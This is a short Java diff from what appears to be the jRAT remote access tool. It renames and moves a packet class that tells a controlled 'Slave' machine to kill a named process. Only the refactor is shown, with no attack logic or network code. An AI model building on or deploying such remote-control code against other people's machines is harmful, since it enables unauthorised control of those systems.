@@ -1,15 +1,16 @@
-package jrat.controller.packets.outgoing;
+package jrat.module.process;
 
 import jrat.controller.Slave;
+import jrat.controller.packets.outgoing.AbstractOutgoingPacket;
 
 import java.io.DataOutputStream;
 
 
-public class Packet20KillProcess extends AbstractOutgoingPacket {
+public class PacketKillProcess extends AbstractOutgoingPacket {
 
 	private String process;
 
-	public Packet20KillProcess(String process) {
+	public PacketKillProcess(String process) {
 		this.process = process;
 	}
 
